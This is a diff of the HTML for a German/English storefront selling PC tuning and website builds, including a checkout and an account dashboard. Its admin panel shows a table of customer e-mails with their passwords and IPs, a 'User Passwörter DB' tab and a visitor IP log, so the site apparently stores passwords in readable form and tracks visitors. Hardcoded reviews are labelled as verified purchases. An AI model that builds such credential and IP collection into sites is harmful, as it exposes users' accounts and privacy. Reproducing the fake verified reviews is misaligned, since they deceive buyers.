-                        <button onclick="addToCartDirect('Custom Website Build', 25.00)" class="w-full py-2.5 rounded-xl bg-accent hover:opacity-95 text-white text-xs font-bold transition flex items-center justify-center gap-2 shadow-lg shadow-pink-500/20">
-                            <i class="fa-solid fa-cart-plus"></i> Kaufen
+                        <button onclick="buyNowDirect('Website Build', 25.00)" class="py-3 text-center bg-accent hover:opacity-90 text-white rounded-xl transition font-bold text-xs flex items-center justify-center gap-1.5 shadow-lg">
+                            <i class="fa-solid fa-bolt"></i> Kaufen
                         </button>
-                    </div>
-                </div>
-            </div>
-
-        </div>
-
-        <!-- Reviews Section -->
-        <section class="mt-20 border-t border-saBorder pt-12">
-            <div class="flex flex-col sm:flex-row sm:items-center justify-between mb-8 gap-4">
-                <div>
-                    <h2 class="text-xl font-extrabold text-white tracking-tight">Kunden-Feedback</h2>
-                    <p class="text-xs text-zinc-400 mt-1">Echte Bewertungen von verifizierten Käufern.</p>
-                </div>
-                <div class="flex items-center gap-2 text-amber-400 text-sm">
-                    <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
-                    <span class="text-xs font-bold text-white ml-2">5.0 (98 Bewertungen)</span>
-                </div>
-            </div>
-
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-5">
-                <div class="bg-[#121217] border border-saBorder p-5 rounded-2xl space-y-3">
-                    <div class="flex items-center justify-between">
-                        <div class="flex text-amber-400 text-xs">
-                            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
-                        </div>
-                        <span class="text-[10px] text-zinc-500">Vor 2 Tagen</span>
-                    </div>
-                    <p class="text-xs text-zinc-300 font-light leading-relaxed">
-                        "Pro Tuning hat sich extrem gelohnt. In Fortnite und Shootern spürt man sofort den Unterschied, 0 Delay. Schneller Support!"
-                    </p>
-                    <div class="text-[11px] font-bold text-white flex items-center gap-2 pt-1 border-t border-saBorder/40">
-                        <span class="w-5 h-5 rounded-full bg-accent/20 text-accent flex items-center justify-center text-[10px]">L</span>
-                        <span>Leon K.</span> <span class="text-[10px] text-emerald-400 font-medium">✓ Verifizierter Kauf</span>
-                    </div>
-                </div>
-
-                <div class="bg-[#121217] border border-saBorder p-5 rounded-2xl space-y-3">
-                    <div class="flex items-center justify-between">
-                        <div class="flex text-amber-400 text-xs">
-                            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
-                        </div>
-                        <span class="text-[10px] text-zinc-500">Vor 1 Woche</span>
-                    </div>
-                    <p class="text-xs text-zinc-300 font-light leading-relaxed">
-                        "Die Website war innerhalb weniger Stunden komplett einsatzbereit. Extrem sauberes Design, danke dir Valentino!"
-                    </p>
-                    <div class="text-[11px] font-bold text-white flex items-center gap-2 pt-1 border-t border-saBorder/40">
-                        <span class="w-5 h-5 rounded-full bg-sky-500/20 text-sky-400 flex items-center justify-center text-[10px]">J</span>
-                        <span>Jonas M.</span> <span class="text-[10px] text-emerald-400 font-medium">✓ Verifizierter Kauf</span>
-                    </div>
-                </div>
-
-                <div class="bg-[#121217] border border-saBorder p-5 rounded-2xl space-y-3">
-                    <div class="flex items-center justify-between">
-                        <div class="flex text-amber-400 text-xs">
-                            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
-                        </div>
-                        <span class="text-[10px] text-zinc-500">Vor 2 Wochen</span>
-                    </div>
-                    <p class="text-xs text-zinc-300 font-light leading-relaxed">
-                        "Mit Litecoin bezahlt, sofort alle Daten und Anweisungen erhalten. Sehr seriös und unkompliziert."
-                    </p>
-                    <div class="text-[11px] font-bold text-white flex items-center gap-2 pt-1 border-t border-saBorder/40">
-                        <span class="w-5 h-5 rounded-full bg-purple-500/20 text-purple-400 flex items-center justify-center text-[10px]">M</span>
-                        <span>Marc D.</span> <span class="text-[10px] text-emerald-400 font-medium">✓ Verifizierter Kauf</span>
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- FAQ Section -->
-        <section class="mt-20 border-t border-saBorder pt-12 max-w-4xl mx-auto">
-            <h2 class="text-xl font-extrabold text-white text-center mb-8">Häufig gestellte Fragen (FAQ)</h2>
-            <div class="space-y-3">
-                <details class="group bg-[#121217] border border-saBorder rounded-2xl p-4 cursor-pointer">
-                    <summary class="flex justify-between items-center text-sm font-bold text-white list-none">
-                        <span>Wie funktioniert die Auslieferung?</span>
-                        <i class="fa-solid fa-chevron-down text-xs text-zinc-400 group-open:rotate-180 transition"></i>
-                    </summary>
-                    <p class="text-xs text-zinc-400 mt-3 font-light leading-relaxed">
-                        Die Bereitstellung erfolgt direkt nach Bestätigung der Zahlung. Die Zugänge und Download-Links werden dir in deinem Account-Dashboard angezeigt und per E-Mail gesendet.
-                    </p>
-                </details>
-
-                <details class="group bg-[#121217] border border-saBorder rounded-2xl p-4 cursor-pointer">
-                    <summary class="flex justify-between items-center text-sm font-bold text-white list-none">
-                        <span>Welche Bezahlmethoden werden unterstützt?</span>
-                        <i class="fa-solid fa-chevron-down text-xs text-zinc-400 group-open:rotate-180 transition"></i>
-                    </summary>
-                    <p class="text-xs text-zinc-400 mt-3 font-light leading-relaxed">
-                        Du kannst bequem per PayPal, Crypto oder direkt über dein vorab aufgeladenes Account-Guthaben bezahlen.
-                    </p>
-                </details>
-
-                <details class="group bg-[#121217] border border-saBorder rounded-2xl p-4 cursor-pointer">
-                    <summary class="flex justify-between items-center text-sm font-bold text-white list-none">
-                        <span>Ist das Pro PC-Tuning sicher für meine Hardware?</span>
-                        <i class="fa-solid fa-chevron-down text-xs text-zinc-400 group-open:rotate-180 transition"></i>
-                    </summary>
-                    <p class="text-xs text-zinc-400 mt-3 font-light leading-relaxed">
-                        Ja, 100%. Es werden keine gefährlichen Tools installiert. Wir optimieren interne Windows-Timer, Puffer und BIOS-Settings so, dass alles absolut stabil und jederzeit wieder rückgängig machbar ist.
-                    </p>
-                </details>
+        <!-- Testimonials -->
+        <section id="testimonials" class="mb-28">
+            <h2 class="text-2xl sm:text-3xl font-bold text-center text-white mb-10">What Clients Say</h2>
+            <div class="grid md:grid-cols-2 gap-6">
+                <div class="nivex-card p-7 md:p-8 rounded-3xl">
+                    <div class="flex text-accent text-xs mb-3 space-x-1"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+                    <p class="text-gray-200 text-xs md:text-sm italic mb-4 font-light leading-relaxed">&quot;Pro Tuning made my PC unbelievably fast. Zero input delay in games, absolutely recommended!&quot;</p>
+                    <p class="text-xs font-bold text-white">Leon K.</p>
+                </div>
+                <div class="nivex-card p-7 md:p-8 rounded-3xl">
+                    <div class="flex text-accent text-xs mb-3 space-x-1"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i></div>
+                    <p class="text-gray-200 text-xs md:text-sm italic mb-4 font-light leading-relaxed">&quot;Super clean work on the website build. My site looks extremely clean and was online instantly.&quot;</p>
+                    <p class="text-xs font-bold text-white">Jonas M.</p>
+                </div>
             </div>
         </section>
 
-        <!-- All Links Callout Section -->
-        <section class="mt-20 bg-[#121217] border border-saBorder rounded-3xl p-6 sm:p-8 flex flex-col sm:flex-row items-center justify-between gap-6 shadow-xl">
-            <div class="flex items-center gap-4 text-center sm:text-left">
-                <div class="w-12 h-12 rounded-2xl bg-accent/20 text-accent flex items-center justify-center text-xl shrink-0">
-                    <i class="fa-solid fa-link"></i>
+        <!-- Kontaktformular -->
+        <section id="contact" class="max-w-2xl mx-auto nivex-card p-7 sm:p-9 rounded-3xl mb-16 shadow-2xl">
+            <h2 class="text-2xl font-bold text-white mb-2 text-center">Get in Touch</h2>
+            <p class="text-xs text-gray-400 text-center mb-8 font-light">Send me a direct message – I'll reply as soon as possible.</p>
+            <form onsubmit="event.preventDefault(); showToast('Nachricht erfolgreich gesendet!');" class="space-y-5">
+                <div>
+                    <label class="block text-xs font-medium text-gray-300 mb-1.5">Your Name</label>
+                    <input type="text" class="w-full bg-[#030305] border border-white/10 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-accent" required placeholder="Your name...">
                 </div>
                 <div>
-                    <h3 class="text-base font-bold text-white">Alle Links & Profile</h3>
-                    <p class="text-xs text-zinc-400 font-light mt-0.5">Finde alle offiziellen Social-Media-Kanäle, Musik und Links auf einen Klick.</p>
+                    <label class="block text-xs font-medium text-gray-300 mb-1.5">Email Address</label>
+                    <input type="email" class="w-full bg-[#030305] border border-white/10 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-accent" required placeholder="you@example.com">
                 </div>
-            </div>
-            <a href="https://linktr.ee/val3nt1no" target="_blank" class="px-6 py-3 rounded-xl bg-accent hover:opacity-90 text-white font-bold text-xs transition flex items-center gap-2 shadow-lg shadow-pink-500/20 whitespace-nowrap">
-                <span>ALL LINKS ÖFFNEN</span>
-                <i class="fa-solid fa-arrow-up-right-from-square text-xs"></i>
-            </a>
+                <div>
+                    <label class="block text-xs font-medium text-gray-300 mb-1.5">Message</label>
+                    <textarea rows="4" class="w-full bg-[#030305] border border-white/10 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-accent" required placeholder="Your message..."></textarea>
+                </div>
+                <button type="submit" class="w-full py-3.5 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition text-xs shadow-xl">Send Message</button>
+            </form>
         </section>
     </main>
 
     <!-- Footer -->
-    <footer class="border-t border-saBorder bg-[#09090b] py-10">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row justify-between items-center gap-6 text-xs text-zinc-500">
-            <div class="flex items-center gap-2.5">
-                <span class="font-extrabold text-white text-sm">Val3ntino.</span>
-                <span>© 2026 Alle Rechte vorbehalten.</span>
-            </div>
-            
-            <div class="flex items-center space-x-6 text-zinc-400">
-                <a href="https://discord.gg/YE2jHSwM7" target="_blank" class="hover:text-white transition flex items-center gap-1.5"><i class="fa-brands fa-discord"></i> Discord</a>
-                <a href="https://x.com/vai3ntino?s=11" target="_blank" class="hover:text-white transition flex items-center gap-1.5"><i class="fa-brands fa-x-twitter"></i> Twitter</a>
-                <a href="https://linktr.ee/val3nt1no" target="_blank" class="hover:text-white text-accent transition flex items-center gap-1.5"><i class="fa-solid fa-link"></i> All Links</a>
-                <button onclick="toggleImpressum()" class="hover:text-white transition underline">Impressum</button>
-            </div>
-
-            <div class="flex items-center gap-1.5 text-zinc-400 font-medium">
-                <i class="fa-solid fa-shield-halved text-accent text-xs"></i>
-                <span>Verifizierter Storefront-Checkout</span>
-            </div>
+    <footer class="py-12 px-6 md:px-12 border-t border-white/5 max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 text-xs text-gray-400">
+        <div class="space-y-3">
+            <a href="#" class="text-lg font-extrabold text-white flex items-center gap-2"><span class="w-2.5 h-2.5 rounded-full bg-accent"></span> Val3ntino</a>
+            <p class="text-gray-400 font-light leading-relaxed">Val3ntino delivers digital products & professional PC tuning instantly after payment.</p>
+        </div>
+        <div>
+            <p class="text-white font-bold mb-3 uppercase tracking-wider text-[11px]">Navigation</p>
+            <ul class="space-y-2 font-light">
+                <li><a href="#" class="hover:text-white transition">Home</a></li>
+                <li><a href="#booking" class="hover:text-white transition">Products</a></li>
+                <li><a href="https://linktr.ee/val3nt1no" target="_blank" class="text-accent hover:underline font-semibold">All Links (Linktree)</a></li>
+            </ul>
+        </div>
+        <div>
+            <p class="text-white font-bold mb-3 uppercase tracking-wider text-[11px]">Account</p>
+            <ul class="space-y-2 font-light">
+                <li><button onclick="toggleDashboardModal()" class="hover:text-white transition text-left">Dashboard & Admin</button></li>
+            </ul>
         </div>
     </footer>
+    <div class="py-6 text-center text-xs text-gray-500 border-t border-white/5 flex justify-center items-center gap-4">
+        <span>Copyright © Val3ntino 2026</span>
+        <button onclick="toggleImpressum()" class="text-gray-400 hover:text-white underline">Imprint</button>
+    </div>
 
-    <!-- ==================== MODALS ==================== -->
-
-    <!-- 1. Quick View Modal -->
-    <div id="productDetailModal" class="modal fixed inset-0 bg-black/80 backdrop-blur-md z-50 items-center justify-center p-4">
-        <div class="bg-[#121217] border border-saBorder rounded-3xl max-w-lg w-full p-6 sm:p-8 relative shadow-2xl space-y-6">
-            <button onclick="closeProductDetail()" class="absolute top-6 right-6 text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
-            
-            <div class="flex items-center gap-4">
-                <div id="detailIconBox" class="w-14 h-14 rounded-2xl bg-white/5 border border-saBorder flex items-center justify-center text-2xl"></div>
-                <div>
-                    <h2 id="detailTitle" class="text-lg font-bold text-white"></h2>
-                    <p id="detailPrice" class="text-base font-black text-accent mt-0.5"></p>
-                </div>
-            </div>
-
-            <p id="detailDesc" class="text-xs text-zinc-300 font-light leading-relaxed"></p>
-
-            <div class="bg-[#09090b] p-4 rounded-2xl border border-saBorder space-y-2 text-xs">
-                <p class="font-bold text-white uppercase tracking-wider text-[10px]">Enthaltene Features:</p>
-                <div id="detailFeatures" class="space-y-1.5 text-zinc-300"></div>
-            </div>
-
-            <div class="flex items-center justify-between pt-2">
-                <div class="flex items-center gap-2 bg-[#09090b] border border-saBorder rounded-xl p-1">
-                    <button onclick="adjustDetailQty(-1)" class="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 text-white flex items-center justify-center"><i class="fa-solid fa-minus text-[10px]"></i></button>
-                    <span id="detailQty" class="px-3 font-bold text-white text-xs">1</span>
-                    <button onclick="adjustDetailQty(1)" class="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 text-white flex items-center justify-center"><i class="fa-solid fa-plus text-[10px]"></i></button>
-                </div>
-                <button id="detailAddToCartBtn" class="px-5 py-2.5 rounded-xl bg-accent text-white font-bold text-xs hover:opacity-90 transition flex items-center gap-2 shadow-lg shadow-pink-500/20">
-                    <i class="fa-solid fa-cart-shopping"></i> In den Warenkorb
-                </button>
+    <!-- Impressum Modal -->
+    <div id="impressumModal" class="modal fixed inset-0 bg-black/80 backdrop-blur-md z-50 items-center justify-center p-4">
+        <div class="nivex-card p-7 rounded-3xl max-w-md w-full relative shadow-2xl">
+            <button onclick="toggleImpressum()" class="absolute top-5 right-5 text-gray-400 hover:text-white text-lg"><i class="fa-solid fa-xmark"></i></button>
+            <h2 class="text-xl font-bold text-white mb-4">Impressum</h2>
+            <div class="text-gray-300 text-xs space-y-3 font-light leading-relaxed">
+                <p>Valentino Lopez<br>Europa-Allee 2<br>60327 Frankfurt am Main</p>
+                <p>E-Mail: L@valentinolopez.de<br>Discord: dri.c</p>
             </div>
         </div>
     </div>
 
-    <!-- 2. Warenkorb Modal -->
+    <!-- Warenkorb Modal -->
     <div id="cartModal" class="modal fixed inset-0 bg-black/80 backdrop-blur-md z-50 items-center justify-center p-4">
-        <div class="bg-[#121217] border border-saBorder rounded-3xl max-w-lg w-full p-6 sm:p-8 relative space-y-5 shadow-2xl">
+        <div class="nivex-card p-6 sm:p-8 rounded-3xl max-w-lg w-full relative space-y-5 shadow-2xl">
             <div class="flex justify-between items-center pb-3 border-b border-saBorder">
-                <div class="flex items-center gap-2.5">
-                    <i class="fa-solid fa-bag-shopping text-accent"></i>
-                    <h2 class="text-base font-extrabold text-white">Dein Warenkorb</h2>
-                </div>
-                <button onclick="toggleCartModal()" class="text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark text-base"></i></button>
+                <h2 class="text-base font-extrabold text-white">Dein Warenkorb</h2>
+                <button onclick="toggleCartModal()" class="text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
             </div>
-
-            <div id="cartItemsContainer" class="space-y-2.5 max-h-56 overflow-y-auto pr-1">
-                <p class="text-xs text-zinc-500 text-center py-8">Dein Warenkorb ist leer.</p>
+            <div id="cartItemsContainer" class="space-y-2.5 max-h-56 overflow-y-auto"></div>
+            <div class="flex justify-between items-center text-sm pt-2 border-t border-saBorder font-bold text-white">
+                <span>Gesamtbetrag:</span>
+                <span id="cartSubtotalOnly" class="text-accent text-lg">€0.00</span>
             </div>
-
-            <div class="bg-[#09090b] p-4 rounded-2xl border border-saBorder space-y-2 text-xs">
-                <div class="flex justify-between text-zinc-400">
-                    <span>Zwischensumme</span>
-                    <span id="cartSubtotalOnly" class="font-bold text-white">€0.00</span>
-                </div>
-                <div id="discountRow" class="flex justify-between text-emerald-400" style="display: none;">
-                    <span>Rabatt (<span id="discountName"></span>)</span>
-                    <span id="discountAmount">-€0.00</span>
-                </div>
-                <div class="flex justify-between items-center text-sm pt-2 border-t border-saBorder/60">
-                    <span class="text-white font-extrabold">Gesamtbetrag</span>
-                    <span id="cartTotalDisplay" class="text-accent font-black text-lg">€0.00</span>
-                </div>
-            </div>
-
-            <div class="flex gap-2">
-                <input type="text" id="couponInput" placeholder="Gutscheincode (z.B. VAL3NTINO)" class="w-full bg-[#09090b] border border-saBorder rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-accent">
-                <button onclick="applyCoupon()" class="px-4 py-2.5 bg-white/10 hover:bg-white/20 text-white font-bold rounded-xl text-xs transition">Einlösen</button>
-            </div>
-            <div id="couponMsg" class="text-[11px]"></div>
-
-            <label class="flex items-center gap-2.5 text-xs text-zinc-400 cursor-pointer">
-                <input type="checkbox" id="agbCheck" onchange="toggleCheckoutBtn()" class="accent-accent w-4 h-4 rounded">
-                <span>Ich stimme den Bedingungen & der digitalen Bereitstellung zu.</span>
-            </label>
-
-            <button onclick="proceedToCheckout()" id="checkoutBtn" disabled class="w-full py-3.5 bg-accent text-white font-extrabold rounded-xl text-xs opacity-50 cursor-not-allowed transition shadow-lg shadow-pink-500/20">
+            <button onclick="proceedToCheckout()" id="checkoutBtn" disabled class="w-full py-3.5 bg-accent text-white font-extrabold rounded-xl text-xs opacity-50 cursor-not-allowed transition">
                 Zur Kasse gehen →
             </button>
         </div>
     </div>
 
-    <!-- 3. NEUES AUTOMATISIERTES CHECKOUT MODAL (Mit PayPal SDK Integration) -->
+    <!-- Automatisierter Checkout Modal -->
     <div id="paymentModal" class="modal fixed inset-0 bg-black/85 backdrop-blur-md z-50 items-center justify-center p-3 sm:p-6">
         <div class="bg-[#09090b] border border-saBorder rounded-3xl max-w-3xl w-full p-6 sm:p-10 relative space-y-6 shadow-2xl">
             <button onclick="togglePaymentModal()" class="absolute top-6 right-6 text-zinc-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
-            
             <div>
-                <span class="text-xs font-bold text-accent uppercase tracking-wider">Automatisierter Checkout</span>
+                <span class="text-xs font-bold text-accent uppercase tracking-wider">Sofort-Checkout</span>
                 <h2 class="text-xl font-extrabold text-white mt-1">Sicher & direkt bezahlen</h2>
             </div>
-
             <div>
                 <label class="block text-xs font-semibold text-zinc-300 mb-1.5">E-Mail für automatisierte Zustellung *</label>
                 <input type="email" id="checkoutEmail" placeholder="deine-email@example.com" class="w-full bg-[#121217] border border-saBorder rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-accent">
             </div>
-
-            <!-- Bestellübersicht -->
             <div class="bg-[#121217] p-4 rounded-2xl border border-saBorder space-y-3">
-                <p class="text-xs font-bold text-zinc-400 uppercase tracking-wider">Warenkorb & Gesamtbetrag</p>
+                <p class="text-xs font-bold text-zinc-400 uppercase tracking-wider">Bestellübersicht</p>
                 <div id="checkoutItemsList" class="space-y-2 text-xs text-zinc-300 max-h-36 overflow-y-auto"></div>
                 <div class="pt-3 border-t border-saBorder flex justify-between items-center text-sm font-black">
                     <span class="text-white">Zu zahlen:</span>
                     <span id="checkoutTotalFinal" class="text-accent text-xl">€0.00</span>
                 </div>
             </div>
-
-            <!-- Automatisierter PayPal Button -->
             <div class="space-y-2 pt-2">
-                <p class="text-xs font-bold text-zinc-300">Wähle deine Zahlungsmethode:</p>
+                <p class="text-xs font-bold text-zinc-300">PayPal Sofort-Bezahlung:</p>
                 <div id="paypal-button-container" class="w-full"></div>
             </div>
         </div>
     </div>
 
-    <!-- 4. Dashboard Modal -->
-    <div id="dashboardModal" class="modal fixed inset-0 bg-black/85 backdrop-blur-md z-50 items-center justify-center p-2 sm:p-6">
-        <div class="bg-[#09090b] border border-saBorder rounded-3xl max-w-6xl w-full grid md:grid-cols-[240px_1fr] shadow-2xl overflow-hidden max-h-[92vh] overflow-y-auto">
+    <!-- Professionelles Dashboard & Admin Panel Modal -->
+    <div id="dashboardModal" class="modal fixed inset-0 bg-black/90 backdrop-blur-lg z-50 items-center justify-center p-2 sm:p-6">
+        <div class="bg-[#09090b] border border-saBorder rounded-3xl max-w-6xl w-full grid md:grid-cols-[260px_1fr] shadow-2xl overflow-hidden max-h-[92vh] overflow-y-auto">
             
             <div class="bg-[#121217] p-6 border-b md:border-b-0 md:border-r border-saBorder flex flex-col justify-between space-y-6">
                 <div class="space-y-6">
-                    <div class="flex items-center gap-3">
-                        <div id="userAvatarLetter" class="w-9 h-9 rounded-xl bg-accent text-white font-black text-sm flex items-center justify-center">L</div>
+                    <div class="flex items-center gap-3.5 bg-[#09090b] p-3 rounded-2xl border border-saBorder">
+                        <div id="userAvatarLetter" class="w-10 h-10 rounded-xl bg-gradient-to-tr from-accent to-purple-600 text-white font-black text-sm flex items-center justify-center shadow">V</div>
                         <div class="truncate">
-                            <p class="text-xs font-bold text-white">Mein Account</p>
-                            <p id="userEmailDisplay" class="text-[10px] text-zinc-400 truncate max-w-[140px]"></p>
+                            <p class="text-[11px] font-extrabold text-white">Val3ntino Client</p>
+                            <p id="userEmailDisplay" class="text-[10px] text-zinc-400 truncate max-w-[130px]"></p>
                         </div>
                     </div>
 
                     <div class="space-y-1.5 text-xs font-semibold">
-                        <button onclick="switchTab('orders')" id="tabBtnOrders" class="w-full text-left px-3 py-2.5 rounded-xl bg-accent/20 text-accent font-bold flex items-center gap-2.5">
-                            <i class="fa-solid fa-box text-sm"></i> Bestellungen
+                        <button onclick="switchTab('orders')" id="tabBtnOrders" class="w-full text-left px-3.5 py-3 rounded-xl bg-accent/20 text-accent font-bold flex items-center gap-3 transition">
+                            <i class="fa-solid fa-box text-sm w-4"></i> Meine Bestellungen
                         </button>
-                        <button onclick="switchTab('balance')" id="tabBtnBalance" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-white/5 text-zinc-400 hover:text-white flex items-center justify-between transition">
-                            <span class="flex items-center gap-2.5"><i class="fa-solid fa-wallet text-sm"></i> Guthaben</span>
+                        <button onclick="switchTab('balance')" id="tabBtnBalance" class="w-full text-left px-3.5 py-3 rounded-xl hover:bg-white/5 text-zinc-400 hover:text-white flex items-center justify-between transition">
+                            <span class="flex items-center gap-3"><i class="fa-solid fa-wallet text-sm w-4"></i> Guthaben</span>
                             <span id="sidebarBalance" class="text-accent font-bold">€0.00</span>
                         </button>
-                        <button onclick="switchTab('admin')" id="tabBtnAdmin" class="hidden w-full text-left px-3 py-2.5 rounded-xl hover:bg-white/5 text-amber-400 font-bold flex items-center gap-2.5 transition border border-amber-500/30">
-                            <i class="fa-solid fa-shield-halved text-sm"></i> Admin Panel
+                        <button onclick="switchTab('admin')" id="tabBtnAdmin" class="hidden w-full text-left px-3.5 py-3 rounded-xl hover:bg-white/5 text-amber-400 font-bold flex items-center gap-3 transition border border-amber-500/30">
+                            <i class="fa-solid fa-shield-halved text-sm w-4"></i> Admin Panel
                         </button>
                     </div>
                 </div>
 
-                <button onclick="handleLogout()" class="w-full text-left px-3 py-2.5 rounded-xl text-red-400 hover:bg-red-500/10 text-xs font-semibold flex items-center gap-2 transition">
-                    <i class="fa-solid fa-right-from-bracket"></i> Abmelden
+                <button onclick="handleLogout()" class="w-full text-left px-3.5 py-3 rounded-xl text-red-400 hover:bg-red-500/10 text-xs font-semibold flex items-center gap-3 transition">
+                    <i class="fa-solid fa-right-from-bracket w-4"></i> Abmelden
                 </button>
             </div>
 
-            <div class="p-6 sm:p-8 relative space-y-6 overflow-y-auto">
-                <button onclick="toggleDashboardModal()" class="absolute top-6 right-6 text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <div class="p-6 sm:p-10 relative space-y-6 overflow-y-auto">
+                <button onclick="toggleDashboardModal()" class="absolute top-6 right-6 text-zinc-400 hover:text-white text-lg"><i class="fa-solid fa-xmark"></i></button>
 
-                <div id="tabContentOrders" class="space-y-4">
+                <!-- Orders Tab -->
+                <div id="tabContentOrders" class="space-y-5">
                     <div>
-                        <h3 class="text-base font-bold text-white">Bestellverlauf</h3>
-                        <p class="text-xs text-zinc-400">Übersicht aller Käufe und Downloads.</p>
+                        <h3 class="text-xl font-extrabold text-white">Bestellhistorie & Downloads</h3>
+                        <p class="text-xs text-zinc-400">Deine erworbenen Produkte und Lizenzen im Überblick.</p>
                     </div>
-                    <div id="userOrdersList" class="space-y-2.5"></div>
+                    <div id="userOrdersList" class="space-y-3"></div>
                 </div>
 
+                <!-- Balance Tab -->
+                <div id="tabContentBalance" class="hidden space-y-6">
+                    <div>
+                        <h3 class="text-xl font-extrabold text-white">Account-Guthaben verwalten</h3>
+                        <p class="text-xs text-zinc-400">Lade Guthaben auf, um zukünftige Käufe in Sekundenschnelle abzuwickeln.</p>
+                    </div>
+                    <div class="bg-[#121217] p-6 sm:p-8 rounded-3xl border border-saBorder flex flex-col sm:flex-row sm:items-center justify-between gap-6">
+                        <div>
+                            <span class="text-xs text-zinc-400 uppercase tracking-wider font-semibold">Aktuelles Guthaben</span>
+                            <h2 id="balanceTabDisplay" class="text-3xl font-black text-white mt-1">€0.00</h2>
+                        </div>
+                        <div class="flex flex-wrap gap-2">
+                            <button onclick="topUpBalance(10)" class="px-4 py-3 bg-white/5 hover:bg-white/10 text-white font-bold rounded-xl text-xs border border-saBorder transition">+ 10 €</button>
+                            <button onclick="topUpBalance(25)" class="px-4 py-3 bg-white/5 hover:bg-white/10 text-white font-bold rounded-xl text-xs border border-saBorder transition">+ 25 €</button>
+                            <button onclick="topUpBalance(50)" class="px-5 py-3 bg-accent hover:opacity-90 text-white font-bold rounded-xl text-xs shadow-lg shadow-pink-500/20 transition">+ 50 €</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Admin Control Center -->
                 <div id="tabContentAdmin" class="hidden space-y-6">
                     <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-saBorder pb-4 gap-3">
                         <div>
-                            <h2 class="text-lg font-extrabold text-white flex items-center gap-2">
-                                <i class="fa-solid fa-shield-halved text-accent"></i> Admin Control Center
+                            <h2 class="text-xl font-extrabold text-white flex items-center gap-2">
+                                <i class="fa-solid fa-shield-halved text-amber-400"></i> Admin Management Center
                             </h2>
-                            <p class="text-xs text-zinc-400">Vollzugriff auf User-Datenbank & Besucher-IPs.</p>
+                            <p class="text-xs text-zinc-400">Zentrale Steuerung für Bestellungen, Gutscheine, User-DB & IPs.</p>
                         </div>
-                        <span class="text-[10px] bg-accent/20 text-accent border border-accent/30 px-3 py-1 rounded-full font-mono font-bold">
-                            Admin: l@valentinolopez.de
+                        <span class="text-[10px] bg-amber-500/10 text-amber-400 border border-amber-500/30 px-3 py-1 rounded-full font-mono font-bold">
+                            l@valentinolopez.de
                         </span>
                     </div>
 
-                    <div class="bg-[#121217] p-5 rounded-2xl border border-saBorder space-y-3">
-                        <h4 class="text-xs font-bold text-white uppercase">E-Mail & Passwort Historie Datenbank</h4>
-                        <table class="w-full text-left border-collapse text-xs font-mono">
-                            <thead><tr class="border-b border-saBorder text-[10px] text-zinc-400"><th class="py-2 px-2">Zeit</th><th class="py-2 px-2">Aktion</th><th class="py-2 px-2">E-Mail</th><th class="py-2 px-2">Passwort</th><th class="py-2 px-2">IP</th></tr></thead>
-                            <tbody id="adminUserDbTable" class="divide-y divide-saBorder/50 text-[11px]"></tbody>
-                        </table>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="switchAdminSubTab('orders')" id="admSub-orders" class="px-4 py-2.5 rounded-xl text-xs font-bold bg-accent text-white shadow-md">Orders</button>
+                        <button onclick="switchAdminSubTab('coupons')" id="admSub-coupons" class="px-4 py-2.5 rounded-xl text-xs font-semibold bg-[#121217] text-zinc-300 border border-saBorder hover:text-white">Gutscheine</button>
+                        <button onclick="switchAdminSubTab('users')" id="admSub-users" class="px-4 py-2.5 rounded-xl text-xs font-semibold bg-[#121217] text-zinc-300 border border-saBorder hover:text-white">User Passwörter DB</button>
+                        <button onclick="switchAdminSubTab('ips')" id="admSub-ips" class="px-4 py-2.5 rounded-xl text-xs font-semibold bg-[#121217] text-zinc-300 border border-saBorder hover:text-white">Besucher IPs</button>
                     </div>
 
-                    <div class="bg-[#121217] p-5 rounded-2xl border border-saBorder space-y-3">
-                        <h4 class="text-xs font-bold text-white uppercase">Live Besucher IPs</h4>
-                        <table class="w-full text-left border-collapse text-xs font-mono">
-                            <thead><tr class="border-b border-saBorder text-[10px] text-zinc-400"><th class="py-2 px-2">Uhrzeit</th><th class="py-2 px-2">IP-Adresse</th><th class="py-2 px-2">Standort</th><th class="py-2 px-2">Browser</th></tr></thead>
-                            <tbody id="adminIpLogTable" class="divide-y divide-saBorder/50 text-[11px]"></tbody>
-                        </table>
+                    <div id="admBox-orders" class="bg-[#121217] p-6 rounded-3xl border border-saBorder space-y-4">
+                        <h4 class="text-xs font-bold text-white uppercase">Bestellungen</h4>
